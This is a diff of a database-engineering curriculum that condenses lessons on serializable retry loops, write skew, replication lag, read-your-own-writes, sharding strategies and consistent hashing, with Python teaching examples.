-# ---- The retry loop that SERIALIZABLE makes mandatory, not optional ----
-import psycopg2, time
-from psycopg2 import errors
-from psycopg2.extensions import ISOLATION_LEVEL_SERIALIZABLE
+# SERIALIZABLE (and often RR) can abort through no fault of your logic.
+# Code without a retry loop works in dev and fails under concurrency.
 
 def run_serializable(conn, work, max_attempts=5):
-    """At SERIALIZABLE (or REPEATABLE READ), a transaction can be aborted by
-    the database through no fault of its own. Code without this loop is code
-    that works in development and fails under production concurrency."""
-    conn.set_isolation_level(ISOLATION_LEVEL_SERIALIZABLE)
+    """Pseudo-API shaped like psycopg2 — adapt to your driver."""
+    import time
     for attempt in range(max_attempts):
         try:
-            with conn:                       # BEGIN ... COMMIT / ROLLBACK
-                with conn.cursor() as cur:
-                    return work(cur)
-        except errors.SerializationFailure:
-            time.sleep(0.05 * (2 ** attempt))   # exponential backoff
-            continue
+            conn.execute("BEGIN ISOLATION LEVEL SERIALIZABLE")
+            result = work(conn)
+            conn.execute("COMMIT")
+            return result
+        except Exception as e:
+            conn.execute("ROLLBACK")
+            if "could not serialize" not in str(e).lower() and type(e).__name__ != "SerializationFailure":
+                raise
+            time.sleep(0.05 * (2 ** attempt))
     raise RuntimeError("gave up after serialization conflicts")
 
-def go_off_call(cur):
-    cur.execute("SELECT COUNT(*) FROM shifts WHERE on_call")
-    if cur.fetchone()[0] <= 1:
-        raise ValueError("cannot leave: you are the last doctor on call")
-    cur.execute("UPDATE shifts SET on_call = false WHERE doctor = %s", ('alice',))
+def go_off_call(conn, doctor="alice"):
+    n = conn.execute("SELECT COUNT(*) FROM shifts WHERE on_call").fetchone()[0]
+    if n <= 1:
+        raise ValueError("cannot leave: last doctor on call")
+    conn.execute("UPDATE shifts SET on_call = false WHERE doctor = ?", (doctor,))
 
-# run_serializable(conn, go_off_call)
-# Two concurrent callers: one commits, one gets a SerializationFailure and
-# is retried, at which point it correctly sees COUNT = 1 and refuses.
+# Two concurrent callers: one commits; the other retries and then correctly refuses.
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Choice | Buys | Costs |
+| ------ | ---- | ----- |
+| Read Committed | No dirty reads; high concurrency | Non-repeatable reads legal |
+| Serializable | Prevents write skew | More aborts; retry mandatory |
+| MVCC | Readers ∥ writers | Version bloat; vacuum |
+| `FOR UPDATE` | Safe under hot conflicts | Contention / deadlock risk |
+| Optimistic version | No long locks | You own the retry |
 
-Being able to explain what would go wrong *without* each individual ACID guarantee - not just recite the acronym - is what separates a memorized answer from a real one. Beyond that, the questions asked most often are: "two users try to book the last seat, walk me through what happens and how you prevent it" (the lost update, and the three fixes above, with the single-statement version being the best answer); "what isolation level does your database default to and what does that permit" (Read Committed in Postgres, Repeatable Read in MySQL, and non-repeatable reads are legal in the former); "what is the difference between optimistic and pessimistic locking and when would you choose each" (rare versus frequent conflicts); and "how do you make an operation atomic across two services" (there is no good answer, so name two-phase commit's blocking problem and describe a saga with compensations).
+**PRACTICE:**
 
-Two things reliably distinguish a senior answer. The first is volunteering **write skew**, because it is the anomaly that most often reaches production and the one that a candidate who has only memorized the acronym has never heard of. The second is mentioning that **your application must retry** on serialization failures, since a lot of otherwise-good answers describe raising the isolation level without acknowledging that doing so introduces a new failure mode the caller has to handle. Saying "which database, because the standard names are implemented differently" when asked about Repeatable Read is also a genuine signal rather than a hedge.
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | One sentence per ACID letter: the bug without it |
+| Easy | Produce a non-repeatable read at Read Committed in two sessions; raise to RR and show it vanish |
+| Medium | Lost update on last seat — fix three ways (`FOR UPDATE`, version column, conditional `UPDATE`) |
+| Medium | Write skew with on-call doctors at RR; show Serializable aborting one |
+| Medium | Implement the serialization retry loop with backoff in your stack |
+| Hard | Checkout spanning inventory DB + payments API — why not one txn; sketch a saga |
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHAT THIS UNLOCKS NEXT:**
 
+One well-indexed, transactional database still has a ceiling: one machine's CPU, memory, and disk. Availability and throughput beyond that mean copies and splits — replication, partitioning, sharding — Phase 65. Not full distributed consensus yet; that is a later story.
 
-| Difficulty | Task                                                                                                                                                                                                                                |
-| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Open two database sessions and produce a dirty read at Read Uncommitted (use MySQL, since Postgres does not implement that level)                                                                                                   |
-| Easy       | Produce a non-repeatable read at Read Committed, then raise the level to Repeatable Read and show it disappear                                                                                                                      |
-| Easy       | For each ACID letter, write one sentence describing a specific bug that would exist without it                                                                                                                                      |
-| Easy       | Explain why `UPDATE events SET seats = seats - 1 WHERE seats > 0` cannot oversell, without any locking                                                                                                                              |
-| Medium     | Reproduce the lost update on the last-seat table, then fix it three ways (`FOR UPDATE`, a version column, and a single conditional statement) and compare them                                                                      |
-| Medium     | Produce write skew with the on-call doctors table at Repeatable Read, then show Serializable rejecting it                                                                                                                           |
-| Medium     | Run [Hermitage](https://github.com/ept/hermitage) against both Postgres and MySQL and write down every place their behavior differs at the same named isolation level                                                               |
-| Medium     | Cause a genuine database deadlock with two sessions locking two rows in opposite orders, read the error message, and fix it with a consistent lock order                                                                            |
-| Medium     | Write the serialization-failure retry loop for your language and framework, with exponential backoff and a cap                                                                                                                      |
-| Medium     | Implement optimistic locking end to end in an API endpoint, including the 409 response when the version check fails                                                                                                                 |
-| Hard       | Design the transaction boundaries for a checkout flow that reserves inventory, charges a card via an external API, and writes an order. Explain why this cannot be one transaction and write the saga with its compensating actions |
-| Hard       | Measure throughput at all four isolation levels under a concurrent write workload and plot the correctness-versus-throughput curve for your own database                                                                            |
-| Hard       | Implement MVCC yourself: a key-value store where each write appends a new version tagged with a transaction id, and reads select the newest version visible to their snapshot                                                       |
-| Hard       | Explain how Postgres's Serializable Snapshot Isolation detects write skew without taking locks, and what it costs                                                                                                                   |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Scaling - Replication, Partitioning, Sharding:** A single database server, however well-indexed and correctly transactional, eventually hits a hard ceiling: one machine's CPU, memory, and disk I/O. What happens once a table has a billion rows, or a single server can't keep up with the read or write traffic?
 
 ---
 
@@ -12549,372 +11502,118 @@ Two things reliably distinguish a senior answer. The first is volunteering **wri
 
 **WHAT YOU WILL BE ABLE TO DO:** Explain replication lag and a read-your-own-writes fix; contrast **replication** (copies) vs **partitioning** (split data) vs **sharding** (partitioning across servers); and name cheaper options to try before you shard.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 64 (ACID on one machine - scaling is what happens when one machine is not enough).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 64 — ACID on one machine.
 
-> **Boundary - Story XI owns the rest:** Phase 65 is *database operations* scaling: replicas, lag, shard keys, and the "try cheaper things first" ladder. It does **not** teach CAP, consensus, quorum internals, or multi-service distributed design - those are Phases 81-88. Stop here when the answer becomes "we need a consensus algorithm."
+> **Boundary:** Phase 65 is database *operations* scaling — replicas, lag, shard keys, the "try cheaper things first" ladder. It does **not** teach CAP, consensus, or multi-service design (Phases 81–88). Stop when the answer becomes "we need a consensus algorithm."
+
+**LEARNING RESOURCES:**
+
+- [Database Sharding and Partitioning (Exponent)](https://www.youtube.com/watch?v=be6PLMKKSto)
+- [Database Replication Explained (Exponent)](https://www.youtube.com/watch?v=bI8Ry6GhMSE)
+- [7 Strategies to Scale Your Database (ByteByteGo)](https://www.youtube.com/watch?v=_1IKwnbscQU)
+- [PostgreSQL High Availability](https://www.postgresql.org/docs/current/high-availability.html)
+- [DDIA](https://dataintensive.net/) chapters 5–6; [Vitess](https://vitess.io/docs/) for practiced sharding
 
 ## 65.1 Replication, Partitioning & Sharding
 
-**WHY YOU ARE LEARNING THIS:** A single database server is a single point of failure (it goes down, the whole application goes down) and a single ceiling on throughput (one machine's disk and CPU are finite). Scaling a database means spreading the load, and the two dimensions you can spread it along are *copies of the same data* (replication) and *splitting the data itself* (partitioning/sharding).
+One bookstore primary that is correctly ACID is still one failure domain and one throughput ceiling. Scaling spreads load along two axes that people constantly mash together.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- Best animated explanation: [Database Sharding and Partitioning (Exponent)](https://www.youtube.com/watch?v=be6PLMKKSto) *(Composio YouTube)*
-- Alternative: [Database Replication & Sharding Explained (Hayk Simonyan)](https://www.youtube.com/watch?v=jLEp1XI_L6Q) *(Composio YouTube)*; [Database Replication Explained (Exponent)](https://www.youtube.com/watch?v=bI8Ry6GhMSE)
-- Another angle: [7 Must-know Strategies to Scale Your Database (ByteByteGo)](https://www.youtube.com/watch?v=_1IKwnbscQU) puts replication and sharding in the correct order among the cheaper options that should be tried first, and [Consistent Hashing: Easy Explanation for System Design Interviews (Hello Interview)](https://www.youtube.com/watch?v=vccwdhfqIrI) plus [Consistent Hashing (ByteByteGo)](https://www.youtube.com/watch?v=UF9Iqmg94tk) cover the specific algorithm that makes adding a shard survivable
-- Interactive simulator: run replication yourself with Docker. `docker compose` a Postgres primary with one streaming replica, write to the primary, read from the replica, then deliberately pause the replica and watch `pg_stat_replication` report the lag growing. Nothing else makes replication lag feel real. For sharding, [Vitess's local examples](https://vitess.io/docs/get-started/local/) let you shard a MySQL database on your laptop and watch a resharding operation complete
-- Written documentation: [Designing Data-Intensive Applications](https://dataintensive.net/) chapters 5 and 6 are the definitive treatment of replication and partitioning respectively and are worth reading in full, [PostgreSQL's replication documentation](https://www.postgresql.org/docs/current/high-availability.html) covers the real operational knobs including synchronous versus asynchronous commit, and [Vitess's documentation](https://vitess.io/docs/) explains sharding as actually practised when the amount of work grows
-- GitHub implementation: [vitessio/vitess](https://github.com/vitessio/vitess) - the sharding layer that ran YouTube's MySQL, and its resharding design documents are unusually clear. [citusdata/citus](https://github.com/citusdata/citus) is the same idea for Postgres, and reading how it plans a distributed join is instructive
-- Practice platform: build it rather than read about it. Set up primary-replica Postgres in Docker, measure lag under load, then promote the replica after killing the primary and note exactly what you lost. Then shard a table by hash across two databases in application code and write the scatter-gather query. [System Design Primer](https://github.com/donnemartin/system-design-primer) has the interview-shaped exercises
-
-**STEP-BY-STEP EXPLANATION**
-
-Three words people mash together - keep them separate:
+**WHEN ONE MACHINE IS NOT ENOUGH:**
 
 | Term | What it does | Buys you |
 | ---- | ------------ | -------- |
-| **Replication** | Same data on multiple machines | Availability + more read capacity; writes still usually hit one leader |
-| **Partitioning** | Split different rows (or tables) into pieces | Smaller working sets; can be *within one machine* (table partitions) or across machines |
-| **Sharding** | Partitioning **across multiple database servers** | Storage + write throughput beyond one machine; pays with cross-shard pain |
+| **Replication** | Same data on multiple machines | Availability + read capacity; writes usually still hit one leader |
+| **Partitioning** | Split different rows/tables into pieces | Smaller working sets; can stay on *one* machine |
+| **Sharding** | Partitioning **across** database servers | Storage + write throughput beyond one box; pays with cross-shard pain |
 
-The two dimensions are genuinely independent, and conflating them is the most common source of confusion. **Replication** copies the same data to multiple machines, which buys availability and read throughput. **Partitioning** splits different data across pieces (sometimes still one server). **Sharding** is the distributed form of partitioning. Real systems do both: each shard is itself replicated, so a cluster is a grid rather than a line.
+Real systems do both: each shard is itself replicated.
 
-Replication comes in three topologies with sharply different properties. **Single-leader** replication designates one node that accepts all writes and streams its changes to followers, which is the default in Postgres and MySQL and is right for the overwhelming majority of systems because it entirely avoids write conflicts. **Multi-leader** replication accepts writes at several nodes, which helps across geographic regions and introduces the genuinely hard problem of conflict resolution when two regions modify the same row. **Leaderless** replication, used by Dynamo-style systems such as Cassandra, sends every write to several nodes and reads from several, resolving disagreements with quorums and version vectors.
-
-The knob that matters most in single-leader replication is **synchronous versus asynchronous** commit, and it is a direct restatement of the durability-versus-latency trade. Asynchronous replication means the leader confirms a write as soon as it is durable locally, so writes are fast and a leader failure can lose recently-acknowledged writes. Synchronous replication means the leader waits for at least one follower to confirm before acknowledging, so nothing acknowledged is ever lost and every write now pays a network round trip, and a slow or dead follower can stall writes entirely. The usual compromise is semi-synchronous: one synchronous follower for safety, the rest asynchronous for throughput.
-
-**Replication lag** is the practical consequence that bites applications, and it has a specific, recurring symptom: a user writes something, is immediately redirected to a read that goes to a replica, and sees their own change missing. The fix is a consistency guarantee called **read-your-own-writes**, and the standard implementations are to route reads to the leader for a short window after a write, to route reads for that user to the leader, or to have the client remember the write's log position and require the replica to have caught up to it. Two related guarantees are worth naming: **monotonic reads** prevents a user seeing time appear to move backwards by hitting a lagging replica after a fresh one, and **consistent prefix reads** prevents seeing an answer before the question it replies to.
-
-Partitioning strategy determines everything about how the system behaves later. **Range partitioning** splits by key ranges, which keeps range queries efficient and creates hotspots whenever the key correlates with activity, which timestamps always do: partitioning by date means all of today's writes hit one shard. **Hash partitioning** distributes evenly by hashing the key, which fixes hotspots and destroys range queries, since adjacent keys are now on different machines. **Directory-based** partitioning keeps an explicit lookup table mapping keys to shards, which is maximally flexible and makes the directory a critical dependency. And **consistent hashing** solves the specific problem that plain hash partitioning creates: with `hash(key) % N`, changing N remaps nearly every key, so adding one shard means moving almost all the data. Consistent hashing places both shards and keys on a ring so adding a shard moves only the keys between it and its neighbor, roughly a 1/N fraction, and virtual nodes smooth out the resulting imbalance.
-
-Choosing the **shard key** is the highest-stakes and least reversible decision in this section. A good key distributes writes evenly and keeps the queries you actually run inside a single shard. Sharding a social application by `user_id` makes "everything about one user" a single-shard query and makes "everything in one city" a scatter-gather across every shard. There is no key that makes all queries local, which is why the honest framing is choosing which queries you are willing to make expensive. And once chosen, changing it means rewriting and moving all of your data, which is why resharding is treated as a project rather than an operation.
-
-What sharding costs you is worth stating bluntly because it is easy to underestimate. Cross-shard joins largely stop working, so you either denormalize (Phase 62) or join in the application. Cross-shard transactions lose ACID atomicity, which is exactly where Phase 64's saga discussion becomes relevant. Globally unique ids need a scheme that does not rely on a single auto-increment counter, which is why Snowflake ids and UUIDv7 exist. Global secondary indexes require either a scatter-gather read or a separately maintained index that is itself sharded differently. Aggregate queries and `ORDER BY ... LIMIT` across shards require fetching candidates from every shard and merging. And rebalancing has to happen online, while serving traffic, which is genuinely hard engineering.
-
-Finally, the most important thing about this section: almost nobody needs it as early as they think. Before sharding, the cheaper options in rough order of effort are adding indexes (Phase 63), fixing the queries the indexes reveal, adding a cache, vertically scaling the machine (modern hardware handles a great deal more than people expect), adding read replicas, moving large blobs out to object storage, and table partitioning within a single database, which gets you smaller indexes and cheap bulk deletion of old data without any distribution at all. An interview answer that reaches for sharding immediately is a weaker answer than one that walks that ladder and explains what evidence would justify the next rung.
-
-**Before vs. After, layered - this is the same "complexity evolves because a new requirement was accepted" pattern from Phase 31, now at the systems level:**
+**LEADER / FOLLOWERS AND THE LAG BUG:**
 
 ```text
-Single database server
-        Problem 1 (availability): if this one machine dies, the application
-        has zero database access until it's repaired.
-        Problem 2 (read throughput): every read query competes for the
-        same CPU and disk as every write query.
+SINGLE-LEADER (default in Postgres/MySQL):
 
-        v
+                 writes
+                   |
+                   v
+              +--------+
+              | LEADER |  owns the WAL — stream = same log as crash recovery
+              +--------+
+              /   |    \
+         follower follower follower   <-- reads may go here
 
-Replication -- one primary (accepts writes) + one or more read replicas
-(copies that stay in sync and serve read traffic)
-        Fix: reads can be spread across replicas; if the primary fails,
-        a replica can be promoted.
-        Trade-off: replicas can lag slightly behind the primary
-        ("replication lag"), so a read from a replica can return
-        slightly stale data -- a direct, conscious consistency trade-off.
+ASYNCHRONOUS: ACK after local fsync → fast; leader death can lose recent ACKs.
+SYNCHRONOUS:  ACK after a follower has it → safe; network RTT; slow follower stalls writes.
+SEMI-SYNC:    one sync follower + async rest — common production compromise.
 
-        Problem still remaining: this doesn't help if a SINGLE table has
-        grown too large for one machine's disk, or WRITE throughput
-        (which all still goes to one primary) is the bottleneck.
+REPLICATION LAG (every naive app hits this):
+  t=0  user POSTs a review          -> LEADER
+  t=1  redirect to the product page -> REPLICA 200ms behind
+       -> user's own review is MISSING
 
-        v
+  FIX — read-your-own-writes:
+    (a) stick that user's reads to the leader for N seconds after a write
+    (b) pin reads for recently written keys to the leader
+    (c) client remembers log position (LSN); replica answers only when caught up
 
-Partitioning / Sharding -- split a table's rows across multiple
-independent database servers (e.g. users A-M on server 1, N-Z on server 2)
-        Fix: both storage and write throughput are now spread across
-        multiple machines.
-        Trade-off: a query that needs data from multiple shards (e.g.
-        "top 10 users across the whole system") now requires querying
-        every shard and merging results -- a JOIN across shard boundaries
-        is far more expensive, or sometimes not practically possible at all.
+  Also name: monotonic reads (time must not go backwards across replicas);
+  consistent prefix (do not see a reply before its question).
 ```
 
-**Internal Working, Step by Step - the topologies, the lag, and the ring:**
+Failover: detect timeout → promote newest follower → repoint clients. Async gaps lose acknowledged writes; a resurrected old leader can cause **split brain**. Making "who is leader" a cluster agreement is why consensus appears in Story XI — not here.
+
+**PARTITIONING VS SHARDING:**
+
+**Range** partitioning keeps range queries local and creates hotspots (date keys → all of today's writes hit one piece). **Hash** distributes evenly and destroys range locality; `hash % N` remaps almost everything when N changes. **Consistent hashing** places shards and keys on a ring so adding a shard moves ~1/N of keys; **virtual nodes** even the load. **Directory** maps key→shard explicitly — flexible, and the directory becomes critical.
+
+**Shard key** is the least reversible decision: shard the bookstore by `customer_id` and "Ada's orders" stay local while "top sellers in Doha today" scatter-gather. There is no key that makes every query local — choose which queries you are willing to make expensive.
+
+What sharding takes away: cross-shard joins (denormalize, app join, or co-locate), cross-shard ACID (sagas), `SERIAL` IDs (Snowflake / UUIDv7), global secondary indexes, cheap global `ORDER BY … LIMIT`.
+
+**CLIMB THIS LADDER FIRST:**
 
 ```text
-SINGLE-LEADER REPLICATION, which is what you should reach for first:
-
-                      writes only
-                          |
-                          v
-                   +-------------+
-                   |   LEADER    |  owns the write-ahead log (Phase 60)
-                   +-------------+
-                    /      |      \    streams log records
-                   v       v       v
-            +--------+ +--------+ +--------+
-            |FOLLOWER| |FOLLOWER| |FOLLOWER|   reads may go here
-            +--------+ +--------+ +--------+
-                 ^          ^          ^
-                 |          |          |
-              reads      reads      reads
-
-  The replication stream IS the write-ahead log from Phase 60, shipped over
-  the network and replayed. That is why replication and crash recovery
-  are the same mechanism: both are "replay the log."
-
-SYNCHRONOUS vs ASYNCHRONOUS, on a timeline. The whole trade in one picture:
-
-  ASYNCHRONOUS (default, fast, can lose data)
-    client -> LEADER: write
-              LEADER: append to log, fsync locally
-    client <- LEADER: "committed"          <-- ACKNOWLEDGED HERE
-              LEADER --> follower: (stream, whenever)
-    If the leader dies in that gap, the acknowledged write is GONE.
-    Write latency: local disk only. Fast.
-
-  SYNCHRONOUS (safe, slow, can stall)
-    client -> LEADER: write
-              LEADER: append to log, fsync locally
-              LEADER --> follower: stream
-              LEADER <-- follower: "I have it too"
-    client <- LEADER: "committed"          <-- ACKNOWLEDGED HERE
-    Nothing acknowledged is ever lost. Write latency now includes a
-    NETWORK ROUND TRIP, and if the follower is slow or dead, WRITES STALL.
-
-  SEMI-SYNCHRONOUS (what most production systems actually run)
-    one synchronous follower  -> nothing acknowledged is lost
-    the rest asynchronous     -> throughput, and no single slow node
-                                 can stall the leader
-
-REPLICATION LAG, and the bug it produces in every naive application:
-
-  t=0   user POSTs a new comment      -> LEADER   (write goes to leader)
-  t=1   app redirects to the page     -> REPLICA  (read goes to a replica)
-  t=1   the replica is 200 ms behind
-        -> THE USER'S OWN COMMENT IS MISSING.
-           They refresh. Now it appears. They file a bug that nobody
-           can reproduce, because it depends on which replica answered.
-
-  THE FIX has a name: READ-YOUR-OWN-WRITES. Three implementations:
-    (a) for N seconds after a write, route THAT USER's reads to the leader
-    (b) route reads for any row the user recently wrote to the leader
-    (c) client remembers the write's log position (LSN) and the replica
-        refuses to answer until it has caught up past it
-
-  TWO SIBLING GUARANTEES, each fixing a different visible weirdness:
-    MONOTONIC READS: read 1 hits a fresh replica, read 2 hits a lagging
-        one -> the user watches time move BACKWARDS. Fix: pin a user to
-        one replica.
-    CONSISTENT PREFIX READS: a reply arrives before the question it
-        replies to, because they were written to different partitions.
-        Fix: keep causally-related writes in the same partition.
-
-FAILOVER, and exactly what it costs you:
-
-  LEADER dies
-      |
-      v
-  [1] DETECT: a timeout. Too short -> false positives and needless
-      failovers. Too long -> extended downtime. There is no correct value.
-      |
-      v
-  [2] CHOOSE the most up-to-date follower and promote it
-      |
-      v
-  [3] REPOINT clients and remaining followers at the new leader
-      |
-      v
-  [4] AND NOW THE PROBLEMS:
-      - with ASYNC replication, writes the old leader acknowledged but
-        never shipped are LOST, permanently
-      - if the old leader comes back thinking it is still leader, you
-        have SPLIT BRAIN: two leaders accepting conflicting writes
-      - auto-increment ids the old leader handed out may be reissued
-      This is precisely why Phase 85's consensus algorithms exist: they
-      make "who is the leader" a decision the cluster agrees on rather
-      than a guess each node makes independently.
-
-PARTITIONING STRATEGIES, and what each one breaks:
-
- RANGE: split by key ranges
-    shard 1: users A-H     shard 2: users I-P     shard 3: users Q-Z
-    + range queries stay on one shard: WHERE name BETWEEN 'Ada' AND 'Bob'
-    - HOTSPOTS whenever the key correlates with activity.
-      Partition by DATE and every one of today's writes hits ONE shard
-      while the others idle. This happens constantly, because timestamps
-      are the most tempting range key and the worst one.
-
- HASH: shard = hash(key) % N
-    + writes distribute evenly. No hotspots.
-    - range queries are DESTROYED: adjacent keys are now on different
-      machines, so WHERE created_at > X must ask every shard.
-    - AND THE FATAL FLAW:
-
-        N = 4:   hash(key) % 4    key 1001 -> shard 1
-        N = 5:   hash(key) % 5    key 1001 -> shard 3   <-- MOVED
-
-        Adding ONE shard remaps NEARLY EVERY KEY. Growing from 4 to 5
-        machines means moving ~80% of your data. This is unusable.
-
- CONSISTENT HASHING: the fix for exactly that flaw.
-
-        Place shards AND keys on a ring of hash values 0..2^32.
-        Each key belongs to the first shard clockwise from it.
-
-                       0 / 2^32
-                    S1 . . . . . .
-                  .               .
-              k1 .                 . S2
-                .                   .
-               .         RING        . k2
-                .                   .
-              S4 .                 . k3
-                  .               .
-                    . . . . . . S3
-
-        Now ADD S5 between S1 and S2:
-
-                       0 / 2^32
-                    S1 . . . . . .
-                  .               .
-              k1 .                 . S5   <-- NEW
-                .                   .
-               .                     . S2
-                .                   . k2
-              S4 .                 . k3
-                  .               .
-                    . . . . . . S3
-
-        ONLY the keys between S1 and S5 move. Everything else stays put.
-        Data moved: roughly 1/N instead of nearly everything.
-
-        VIRTUAL NODES: place each physical shard at ~150 points on the
-        ring instead of one, so the load evens out and removing a node
-        spreads its keys across MANY neighbours rather than dumping all
-        of them onto one.
-
- DIRECTORY: an explicit lookup table, key -> shard
-    + total flexibility; move any single key anywhere
-    - the directory is now a critical dependency and a bottleneck
-
-THE SHARD KEY DECISION, which you cannot take back:
-
-  Shard a social app by USER_ID:
-     "everything about user 42"     -> ONE shard.        Fast.
-     "all posts in Doha today"      -> ALL shards.       Scatter-gather.
-     "top 10 posts globally"        -> ALL shards, fetch top 10 from
-                                       each, merge, take 10. Expensive.
-
-  Shard by CITY instead and those costs simply swap places, plus you
-  gain a new hotspot the moment one city is more active than the others.
-
-  THERE IS NO KEY THAT MAKES EVERY QUERY LOCAL. The decision is which
-  queries you are willing to make expensive. Saying that sentence in an
-  interview is worth more than any specific key choice.
-
-WHAT SHARDING TAKES AWAY, all at once:
-
-  BEFORE (one database)              AFTER (sharded)
-  -----------------------------      --------------------------------------
-  JOIN users, orders                 users and orders may be on different
-                                     machines -> join in the app, or
-                                     denormalize (Phase 62), or co-locate by
-                                     making user_id the shard key for both
-
-  BEGIN; ...; COMMIT across rows     no ACID across shards -> Phase 64's saga,
-                                     with compensating actions
-
-  id SERIAL PRIMARY KEY              two shards would both issue id=1
-                                     -> Snowflake ids, UUIDv7, or a
-                                        central id service
-
-  SELECT COUNT(*) FROM orders        ask every shard, sum the answers
-
-  ORDER BY created_at LIMIT 10       fetch 10 from EVERY shard, merge,
-                                     discard the rest
-
-  CREATE INDEX ON orders(email)      a global secondary index is either
-                                     scatter-gather on read, or a second
-                                     index sharded by email and kept in
-                                     sync on write
-
-AND THE LADDER TO CLIMB FIRST, because almost nobody needs shard early:
-
-   1. add the missing indexes (Phase 63)          <- cheapest, biggest win
-   2. fix the queries EXPLAIN just exposed
-   3. add a cache in front (Phase 81)
-   4. scale the machine UP (a modern box handles far more than expected)
-   5. add read replicas                        <- fixes reads + availability
-   6. move blobs to object storage
-   7. PARTITION within one database            <- smaller indexes, cheap
-                                                  bulk deletes, no
-                                                  distribution at all
-   8. only now: SHARD across machines
-
-   Rungs 1 through 7 are reversible. Rung 8 is not. An interview answer
-   that jumps to 8 is weaker than one that walks this ladder and names
-   the evidence that would justify the next rung.
+ 1. indexes (Phase 63)           5. read replicas
+ 2. fix EXPLAIN-exposed queries  6. blobs → object storage
+ 3. cache                        7. PARTITION within one DB
+ 4. bigger machine               8. only then: SHARD
+Rungs 1–7 are reversible. Rung 8 is not.
 ```
-
-**PICTURE IT LIKE THIS**
-
-Replication is like a popular library keeping duplicate copies of the same book at every branch, so any branch can hand out a copy - but a newly returned book takes time to be reshelved and copied to every branch (replication lag). Sharding is like splitting an enormous single card catalog into separate catalogs by last-name range across different rooms - faster to search any one room, but a request spanning the whole alphabet now means checking every room.
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Decision                         | What it buys                                                                     | What it costs                                                                                                            |
-| -------------------------------- | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
-| Read replicas                    | Read throughput scales nearly linearly, and a replica can be promoted on failure | Replication lag, so reads can be stale, and the read-your-own-writes bug appears immediately                             |
-| Asynchronous replication         | Write latency is local disk only                                                 | Acknowledged writes can be lost on leader failure                                                                        |
-| Synchronous replication          | Nothing acknowledged is ever lost                                                | A network round trip on every write, and a slow follower stalls all writes                                               |
-| Single-leader                    | No write conflicts, ever, and it is operationally simple                         | One machine's write capacity is your ceiling, and it is a failover point                                                 |
-| Multi-leader                     | Writes can be accepted in multiple regions                                       | Conflict resolution becomes your problem, and it is genuinely hard to get right                                          |
-| Leaderless / quorum              | No failover event at all, and tunable consistency                                | Application-visible conflicts, version vectors, and read repair                                                          |
-| Range partitioning               | Range queries and sorted scans stay on one shard                                 | Hotspots whenever the key correlates with activity, which timestamps always do                                           |
-| Hash partitioning                | Even write distribution and no hotspots                                          | Range queries must hit every shard, and resizing remaps nearly everything                                                |
-| Consistent hashing               | Adding or removing a shard moves only about 1/N of the data                      | Uneven distribution without virtual nodes, and more moving parts to operate                                              |
-| Sharding at all                  | Storage and write throughput both scale horizontally                             | No cross-shard joins or transactions, global ids and indexes become projects, and the shard key is effectively permanent |
-| Partitioning within one database | Smaller indexes, cheap bulk deletion of old data, and no distributed anything    | Does not add write throughput beyond one machine                                                                         |
-
-
-**SMALL WORKING EXAMPLE**
 
 ```python playground=cs-phase-65-replica-routing
-# ============ 1. Reads to replicas, writes to the leader ============
 import random, time, hashlib, bisect
+from collections import Counter
 
 class Cluster:
-    """The routing layer every replicated system needs, and the read-your-
-    own-writes fix that every naive version is missing."""
+    """Route writes to the leader; fix read-your-own-writes with stickiness."""
 
     def __init__(self, leader, replicas, stickiness_seconds=5.0):
         self.leader = leader
         self.replicas = replicas
         self.stickiness = stickiness_seconds
-        self._recent_writers: dict[str, float] = {}     # user -> last write time
+        self._recent_writers: dict[str, float] = {}
 
     def write(self, user_id, sql, params=()):
         self._recent_writers[user_id] = time.monotonic()
         return self.leader.execute(sql, params)
 
     def read(self, user_id, sql, params=()):
-        # THE FIX: for a short window after this user's own write, read from
-        # the leader. Without this, the user redirects to a replica that is
-        # 200 ms behind and their own comment is missing.
         last = self._recent_writers.get(user_id, 0)
         if time.monotonic() - last < self.stickiness:
-            return self.leader.execute(sql, params)     # read-your-own-writes
+            return self.leader.execute(sql, params)
         return random.choice(self.replicas).execute(sql, params)
 
-    def read_stale_ok(self, sql, params=()):
-        """For analytics and dashboards, where being seconds behind is fine
-        and keeping load off the leader matters more."""
-        return random.choice(self.replicas).execute(sql, params)
 
-# ============ 2. Naive hash sharding, and why it cannot be resized ========
 def naive_shard(key, num_shards):
     return int(hashlib.md5(str(key).encode()).hexdigest(), 16) % num_shards
 
 keys = list(range(10_000))
 before = {k: naive_shard(k, 4) for k in keys}
-after  = {k: naive_shard(k, 5) for k in keys}          # add ONE shard
-moved  = sum(1 for k in keys if before[k] != after[k])
+after = {k: naive_shard(k, 5) for k in keys}
+moved = sum(1 for k in keys if before[k] != after[k])
 print(f"naive hash: adding 1 shard to 4 moves {moved/len(keys):.0%} of keys")
-#  -> about 80%. Unusable in production: you would be copying nearly the
-#     entire dataset to add one machine.
 
-# ============ 3. Consistent hashing: the fix ============
+
 class ConsistentHashRing:
     def __init__(self, shards=(), virtual_nodes=150):
         self.vnodes = virtual_nodes
@@ -12928,193 +11627,69 @@ class ConsistentHashRing:
         return int(hashlib.md5(str(value).encode()).hexdigest(), 16)
 
     def add(self, shard):
-        # Many VIRTUAL points per physical shard, so load evens out and
-        # removing a node spreads its keys across many neighbours rather
-        # than dumping all of them onto exactly one.
         for i in range(self.vnodes):
             point = self._hash(f"{shard}#{i}")
             self._ring[point] = shard
             bisect.insort(self._sorted, point)
 
-    def remove(self, shard):
-        for i in range(self.vnodes):
-            point = self._hash(f"{shard}#{i}")
-            self._ring.pop(point, None)
-            idx = bisect.bisect_left(self._sorted, point)
-            if idx < len(self._sorted) and self._sorted[idx] == point:
-                self._sorted.pop(idx)
-
     def route(self, key) -> str:
-        """The first shard CLOCKWISE from the key's position on the ring."""
         if not self._sorted:
             raise RuntimeError("empty ring")
         point = self._hash(key)
         idx = bisect.bisect_right(self._sorted, point) % len(self._sorted)
         return self._ring[self._sorted[idx]]
 
+
 ring = ConsistentHashRing(["shard-a", "shard-b", "shard-c", "shard-d"])
 before = {k: ring.route(k) for k in keys}
